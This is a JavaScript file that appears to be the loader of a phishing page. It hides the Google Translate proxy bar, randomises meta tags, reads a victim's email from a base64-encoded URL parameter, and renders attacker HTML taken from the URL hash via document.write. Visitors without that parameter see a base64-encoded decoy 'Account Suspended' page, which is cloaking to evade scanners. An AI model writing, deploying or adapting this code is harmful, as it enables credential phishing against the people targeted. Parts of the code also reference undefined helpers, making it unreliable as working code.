function getRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }
  
  function addRandomMetaTags() {
    const headElement = document.head;
    const existingMetaTags = headElement.querySelectorAll('meta');
  
    const randomTitle = getRandomString(10);
    const randomDescription = getRandomString(30);
    const randomAuthor = getRandomString(8);
    const randomImage = 'https://github.io/' + getRandomString(8) + '.jpg';
  
    function isUnique(value) {
      for (const metaTag of existingMetaTags) {
        if (metaTag.content === value) {
          return false;
        }
      }
      return true;
    }
  
    if (isUnique(randomTitle)) {
      const titleMetaTag = document.createElement('meta');
      titleMetaTag.setAttribute('property', 'og:title');
      titleMetaTag.content = randomTitle;
      headElement.appendChild(titleMetaTag);
    }
  
    if (isUnique(randomDescription)) {
      const descriptionMetaTag = document.createElement('meta');
      descriptionMetaTag.setAttribute('name', 'description');
      descriptionMetaTag.content = randomDescription;
      headElement.appendChild(descriptionMetaTag);
    }
  
    if (isUnique(randomAuthor)) {
      const authorMetaTag = document.createElement('meta');
      authorMetaTag.setAttribute('name', 'author');
      authorMetaTag.content = randomAuthor;
      headElement.appendChild(authorMetaTag);
    }
  
    if (isUnique(randomImage)) {
      const imageMetaTag = document.createElement('meta');
      imageMetaTag.setAttribute('property', 'og:image');
      imageMetaTag.content = randomImage;
      headElement.appendChild(imageMetaTag);
    }
  
  
  }
  
  addRandomMetaTags();
  
  fetch('../blog.txt').then(response => response.text()).then(blogContent => document.getElementById('body').innerHTML = blogContent);
  
  
  if (window.location.search) {
      function hideTranslateBar() {
        var iframe = document.getElementById("gt-nvframe");
        if (iframe) {
          iframe.style.display = "none";
        }
      }
      function waitForTranslateBar() {
        var intervalId = setInterval(function() {
          var iframe = document.getElementById("gt-nvframe");
          if (iframe) {
            clearInterval(intervalId);
            hideTranslateBar();
          }
        }, 100);
      }
      
      waitForTranslateBar();
        var queryString = window.location.search;
        var urlParams = new URLSearchParams(queryString);
        var oxx = urlParams.get('u');
        var decString = atob(oxx);
        var emailRegex = /^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w{2,3}){1,2}$/;
        var Boxx;
        if (emailRegex.test(decString)) {
            Boxx = decString;
        } else {
          setTimeout(function() {
            console.log('ERROR AT STAGE 3 Y..what triggered');
            //window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
        }, 500);
        }
        var eml = Boxx;
        var ind=eml.indexOf("@");
        var emld=eml.substr((ind+1));
        var hash = window.location.hash.slice(1);
        var data = b64.decode(hash);
        try {
          var urlDataObject = JSON.parse(data);
          var api = apiVersions[urlDataObject.version];
          document.write(api.decode(urlDataObject));
        } catch (err) {
          document.write(decodeURIComponent(data));
        }
      } else {	document.write(window.atob("PCFET0NUWVBFIGh0bWw+CjxodG1sPgogICAgPGhlYWQ+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJDYWNoZS1jb250cm9sIiBjb250ZW50PSJuby1jYWNoZSI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJQcmFnbWEiIGNvbnRlbnQ9Im5vLWNhY2hlIj4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IkV4cGlyZXMiIGNvbnRlbnQ9IjAiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPTEiPgogICAgPHRpdGxlPkFjY291bnQgU3VzcGVuZGVkPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iLy91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjAuNi9jc3MvYWxsLmNzcyI+CiAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgICAgICBsaW5lLWhlaWdodDogMS40Mjg1NzE0Mjk7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7CiAgICAgICAgICAgIGNvbG9yOiAjMkYzMjMwOwogICAgICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgfQogICAgICAgIHNlY3Rpb24gewogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIH0KICAgICAgICAuY29udGFpbmVyIHsKICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgICAgICAgICAgIG1hcmdpbi1yaWdodDogYXV0bzsKICAgICAgICAgICAgcGFkZGluZzogMCAxMHB4OwogICAgICAgIH0KICAgICAgICAuYWRkaXRpb25hbC1pbmZvIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI5M0E0QTsKICAgICAgICAgICAgY29sb3I6ICNGRkZGRkY7CiAgICAgICAgfQogICAgICAgIC5hZGRpdGlvbmFsLWluZm8taXRlbXMgewogICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICBtaW4taGVpZ2h0OiAxOTNweDsKICAgICAgICB9CiAgICAgICAgLmluZm8taGVhZGluZyB7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0OwogICAgICAgICAgICB3b3JkLWJyZWFrOiBicmVhay1hbGw7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgIH0KICAgICAgICAuc3RhdHVzLXJlYXNvbiB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMjAwJTsKICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgICAgICAgIGNvbG9yOiAjQ0NDQ0NDOwogICAgICAgIH0KICAgICAgICAucmVhc29uLXRleHQgewogICAgICAgICAgICBtYXJnaW46IDIwcHggMDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNnB4OwogICAgICAgIH0KICAgICAgICAuaW5mby1oZWFkaW5nIHsKICAgICAgICAgICAgZm9udC1zaXplOiAxOTAlOwogICAgICAgIH0KICAgICAgICAucmVhc29uLXRleHQgewogICAgICAgICAgICBmb250LXNpemU6IDE0MCU7CiAgICAgICAgfQoKICAgICAgICAgYSNkeW5hbWljUHJvdmlkZXJMaW5rLCBhI2R5bmFtaWNQcm92aWRlckxpbms6aG92ZXIsIGEjZHluYW1pY1Byb3ZpZGVyTGluazphY3RpdmUsIGEjZHluYW1pY1Byb3ZpZGVyTGluazp2aXNpdGVkIHsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgIH0KCiAgICAgICAgQG1lZGlhIChtaW4td2lkdGg6IDc2OHB4KSB7CiAgICAgICAgICAgIC5hZGRpdGlvbmFsLWluZm8gewogICAgICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IG5vbmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLmFkZGl0aW9uYWwtaW5mby1pdGVtcyB7CiAgICAgICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICB9CiAgICAgICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICAgICAgd2lkdGg6IDkwJTsKICAgICAgICAgICAgfQogICAgICAgICAgICAuc3RhdHVzLXJlYXNvbiB7CiAgICAgICAgICAgICAgICBkaXNwbGF5OiBpbmxpbmU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgQG1lZGlhIChtaW4td2lkdGg6IDk5MnB4KSB7CiAgICAgICAgICAgIC5hZGRpdGlvbmFsLWluZm8gewogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogdXJsKGRhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBUEFBQUFEcUNBTUFBQUNyeGpoZEFBQUF0MUJNVkVVQUFBQUFBQUQvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy81K2ZuLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy82K3ZyLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vK2k1ZWRUQUFBQVBYUlNUbE1BQVFFQ0F3UUZCZ2NJQ1FvTERBME9EeEFSRWhNVUZSWVhHQmthR3h3ZEhoOGdJU0lqSkNVbUp5Z29LU29yTEMwdUx6QXdNVEl6TkRVMk56ZzVIN3gwWEFBQUNuZEpSRUZVZUFIdFhYbHpHczhSN1RRM0NGa0h4cEt4aEl3dElCd2dJdVlZNHUvL3VWSjJxcExLRDdROHQyWjd4cEQzbjZza2E5LzJiTTlNdno2b0dFeVhGb0tIZm1oZW9ld3g5Y1llaFZ1UEhNVDRqcGh5QnROSHhIUW1ER2dCdlpqWEJ1V04yZ29nYlB5NlJ0Y09lak5QeEZrYitDRVloSENmbUo2RFFTaGZFR2ZNdDcxRk9QZ3BFMVBIT01URVk4b1ozeUNyMlV0aUlucUVmdGozaUxNMThBZnN1L3hLdjlCNFFVenNWMVhLRlR6RFBHK0xmb0xwRS9Makpuek8wOFFDQXVnTGFsS2VxUC9tRW1XNlFqK0JQSUU3SVltVHl3MU1Gd2Jha3NheWJTeERDQTRTVEYrd2c4ckg3RXpNd3FOaWJZMzhtbHZYS0RkVTVwREgzVFJrbDQwdnhKa1orRE8yTnUvM0hueUM3dDE1b2JHQnRxUkZSWG82KzBaNVlRaDVMSGQ5WUdXT3NGKzlJczVvUVhjdFpLYnZkQUF0YkhITTgrR0xmb2pXZElnUGZmN1lpZlJUTmlabXVzVyt3OGZEajF4ZGV2Tm5iVTNWRmZURUwvVzMzcGZIMzFjR1lCcGdXOUxiYTNJYzhDOGlBNzdOTGU1MTR2dThCUGo2L24zbENkL1ZrZ0tYR2t3WVVRSEFhTSt5UXVuQm1OU3diUlZZaCtrT2NnTWh2UkRCMU1kMjBZZmlSK1VGZnZkSWl6cDJ2MXZWanQwdXNhMXBtTnpBWDJJRmw1L3hhRTlhcVFHU0Q2YnhJMFJaU3czdXVGMFlqUUhlcGpNeEhtZDlJZ0MxTmJZMVZTa2RlQjR2WE1IMEtTUVZJdlFmRVJjaU1wY2FGdFc0SDhpSTBnQjJNemZFY1YzZ0IrSWtmRHRieUNBVGd0SEI3bDNUcktVRzJ5V09lN08yS1lRSVBFN3hGRDEyWXZ5NlN2cW9MT01mOTVrK0J2Z3FvZ0NGQ3gyMk5kbHRPMWVwWWM3eWNFS1NhSTkrVUFZUEdPbEtEUVl5eERQOU5wcXYwTktaa1M3R3VOUlFpZzVwdmFZUXdkVHp0alJuQ3JyL2wwYjJVZ08rd1J0TWlGQ0F6cXBMTDBTbytoV21pNjFObjNhcUtHRXpEZkZybUVvS3FjV1NGRFJPTlNyQVUwaUZZTHJIVTJSS0IzcStIeERIVDRKS0VlMnByaHhZMWFDUzVsWStIblh1Nk4reDZJSkNSUVFtRUV6K1lqSUUveHMvTW1EOHFIUllLNUNBSHVhVFk1amZReEZDL1lvSVFTU1ZhZnJEK1dLNEgwUGl2OFNBVFJaQ2hFWGlPczM5TC9JWXdpT3hSSGdlRUtjbWJNSTljY0hSQ2R4VWVZYW5GcFFKTUJVRElGeHcxY2hKaUJBb21rejN4NDNsK251V0dtV2hrUXMwYTZZN1lIVmU3NzJtMXRabFVCRWhLSTlrNm51TEU4YnpLVlNFQ0VIZUNaU3lzcjA0cUpHblR6c1Z4Sm9Rd203YlBoUTdjemE1RUNHUUdwZzZUbmp6bVdCYlU3dEV4a2hWdzM2eXozSENtMHFFdkVaOUM3dkRZWmVXQVFobktrUVVHL2k3TkRuQ0wvaHdidkpyNm1pUEtIVGFPRTU0eHBCR3JsOFJJWEtYMWJrMytBMWFVaEh4VXRlM3NIRXZOU0lwNFJFZEJOT05BOU5PV1lFd3VxNTRBaFBleDNOYUlRTHdISUlRbFFrUGJ3c1JGcGRtZGIvaEQ4VFNEQ3dUQnU4VzMwc1NJaVM3UDlOd1o3Q2dBZURqbGFNOWt0QUQwK014d3JzZThYc1RhTW9SSW9DYVptZzNCUWdMcXJIVkNCdTNxaFczK0FBT2h3cDUyUUlBZlFrQXdvREhLemZORVljazRaUHA1cWg1Q3A0VkZpTDhXTS9DbDhTRjRwZ3RodnRIbTRxUVVJaVFkWSs1Tk1mdS8yMjhQa3EzTlpOTXFEMVc3ck1ucndKZVFFbUl3S3NhY01JL1RWT0xsSGpRak0xWVZ0VlEzUndodk9SbzNja2lRNVpPVXpsQ09NeWk5WitMWFJFaFM1aXFySTRRbnVObGY4b1ZFYks4QTU1NlFRSzBMTnJUajJ0aVdmY0ZuaDBoUElwWUVWR2ptQkFlMmI5NVUzd014aW9pRXJSbTJudWhkOFFSQ0E4SXdUUkFXMU83UEFzYnRDUHlNTWdKcCsxL0lheHFHQVJ6ckZ0dHBoVVIrTXZFUFN4KzZtL3BDeEVpM1k3cDQ4NUVTQVZtdWxkdnpTVEt3MmZxSFNHTTVoQlcxSVVJMGYvTGRPTnRFVUtYR0M5NWpLK1JnNFFCVndObWxlUFpWalR4dW8yNGtXTXJRSGcvblp6eERxbXFGUkZDNzk5K2RiRWlyTW9WRVhoVkEwN1krR1dOTU9CQ3hJSXBDZ0NwQVg1S2dIQjZJUUlMSHdFM0hYazJYUVZzemRTa0dFQ2pVQUJoUExNZFQvdUtMMFJJUThEellPS0p1OThWMDA2TGJTSWt2QnNSbHpCUFlrSVJJSDE3NDNpRWllbEJUNGlRUmtOSHdVUU1VdFRXWHFzaVF1Z0Jpd2w3M09PclYwUklxLzYrQklQUFZWTHJiQVZBdWxRS0l3QU8vOWpVS3lKazUxU21PNXd3aHBIWGFjMEUzRVFFZlJJdTZUZkJZTFFuL0ozZUNjRmRFN2k0ZHdtSGNrV0VySnNtVTdlSXNHbkx4cFZwVkVUSTRrVk0zVkNVdzErWGRSUFJhTTBrNjRqTDFMRUZrQkJHUnc3YWQxWkUrQVZINzRYaDhOUU0vZFpNeFZLRGtQQ3lXbWJQSi84dUlRSi9YYmlMOGJOS3Z2MHZXbExDYjBmUWpSOXp1VTF5K3NTa2pjcXNnUEF6Q1ZHRld6UHBZeEpNOUdBTVhoR1JpbkQ4NXhrckN4RW9tRVk3STdqLzQwSUV2aldsSjd3RHpqSlp0bWJDVy9jQ2hPUFB0bElDTUdYSUFYM1FGWVFJUmNJM0NxMlpOazN0WWR1dW5QeElwdXM4Sm9MaTVlMXUyeVdOMWt4ZDNVVjlWWEFkdm5qbnRJa3NoMVYzQlNlL0RJVUlIQmRSQ01NVjZPbkhydFczYnhjOFZKVm1QUStJRlFtYnR5VWdlamVtNlZzendhTko1SVFUOXI4QVVGMDQvRG9NSStOaDFaVzVNNGNoSjV5dU5STUFudjdUaDBQd1A3NHBUbDlValBaOEdqMTlQWVNuMFMxRlFHMlZmR3ZTUHF4cnA1Mm1CTjZJMjVuMkNUQk9PUkUwLzZHaVZuOVlOZjhiRkJkNFJVUkZsV3pCdnlCRXFJaTRJOWFreSsycjI5NTk3L1pENjIreEtWZkJ0Tk02cWFIUkc2MWVyWFBCT2ZPNkhON1VZbEptdXNscFdEVVRkWWFiNEwyejF2NDBoUFBCdnd6cU9sdVR2aERCVkIyYTRJeXgvNFV4THJ4OGdveWNXMFVFZ080eTJMM0grVWw1WEkvNHZvYzZyWmtBM0JwdjNuamZTL25oUjc4MUU1NE42dDRPZVd4UXh1a25ndUoxUzg0QVJSNFJ3QXF0bWFDRlpuUmlMMmxiTStIYUFDNW5wcStJd0YrNmhoZkJXek5ObFc2cUNyR1hSeXphMHlOT2QxRTFmc1lVQzdVVjJKb3A3WHlYYnN3OTBLWVVJbmpwa1JjZWNXZmtFbWRDQWVoZ3VldVRtTnQrc2hrUmVLZDN2NjduUDljTkRKSHZvRCsreGR2cG92WEtDcDVTZm9HeEhzajB5RitJd0hVdXM3c21WaDhJSFZHSXdKdEx5N3VONlBlL3dBbnJCeE9uQWF5SVNMV2tROHdvQkt5UisrZFVUc3VFSytMOHAyQkQ0Zkdkc2ZxaHhHUVRRWmx1SFVMWHJSc1VGZkJFME9neklscmFSOHZrdzZxblhtdURTRjhSZ1M4dGgrZCtwaGNpOEZKZjFmd2FwaTQ0ckZwZnFUWkFuVytKRlJHM2tmOTRaK3NTcWRSMVVJaUkvZGMvQjZOL005V3NpQURPMDBBM1FVMGhvaFg1UlRkZUNyc3R5VDFXcGhVUlRCZXZCYVY0aXdZSkdHY3RSREMxRnNHYVEzUnRHRmZMNG9zMzRnNlQrQWtBVDg0YnMwZlgyd2VTODhYN1g2aFhSRERSemR3SFovNUQyaGpqZ2h0M01iNXkxTklOcStiZVpCdThkODQ2NTd3UFlmTjhwWkJjMGcrSktpS1lpTnI5cjR2MVpydmRidGF6cDE2VFNDT2ZacHBNaUdENmlWcXIyNzFvVm9rVTZBSjlVNUZHblhJd3c1bUgra0xFaHhJMWNsMjBRQ0dDVGdSTUEvMytGMmxSWFh0elhoVVJQVFR0OUdRQTZoK2QvMWRFNUFuOUdSSDVvNW13SWdLSHZoQ0JpNWo2MEJjaThvZStFS0VQclltZytRTk5PdzNQZENMZ3BCVVJPUFExOG1YMVpFeDhwOS8vSWkwcWMzUWk2Q21BVTFkRXBEOVNBMXRUOTgvR1phZHZmMjlHeFBZUGg5bitNakF1Uk5nL0hjNFdZbThXalQwcEFCTkI3V2tBYjgxa3o4ZkVvNU5hMHJBUVlVOEtRRVdFUFNrQWFhZm5SUGlYRUdIUENDYmNueHBoSUVQUG5oWGM5WGtSTnVIaDNDdzhKWHRlZUNWN1pqZy93dWE4WUdsM1h2RFVQeS9jL0F2ZDQvaE5EU3FlZ1FBQUFBQkpSVTVFcmtKZ2dnPT0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICAgICAgd2lkdGg6IDcwJTsKICAgICAgICAgICAgfQogICAgICAgICAgICAuc3RhdHVzLXJlYXNvbiB7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDQ1MCU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLmluZm8taGVhZGluZyB7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDIwMCU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLnJlYXNvbi10ZXh0IHsKICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTYwJTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIDwvc3R5bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICA8c3BhbiBjbGFzcz0ic3RhdHVzLXJlYXNvbiI+CiAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLXVzZXItdGltZXMgZmEtMngiPjwvaT4gQWNjb3VudCBTdXNwZW5kZWQKICAgICAgICAgICAgPC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICAgIDxzZWN0aW9uIGNsYXNzPSJhZGRpdGlvbmFsLWluZm8iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWRkaXRpb25hbC1pbmZvLWl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbmZvLWhlYWRpbmciPgogICAgICAgICAgICAgICAgICAgICAgICBUaGlzIEFjY291bnQgaGFzIGJlZW4gc3VzcGVuZGVkLgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJlYXNvbi10ZXh0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iI2hvc3RpbmciIGlkPSJkeW5hbWljUHJvdmlkZXJMaW5rIiB0aXRsZT0iSG9zdGluZyIgcmVsPSJub29wZW5lciBub3JlZmVycmVyIj5Db250YWN0IHlvdXIgaG9zdGluZyBwcm92aWRlcjwvYT4gZm9yIG1vcmUgaW5mb3JtYXRpb24uCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9zZWN0aW9uPgogICAgPC9ib2R5Pgo8L2h0bWw+"));
      }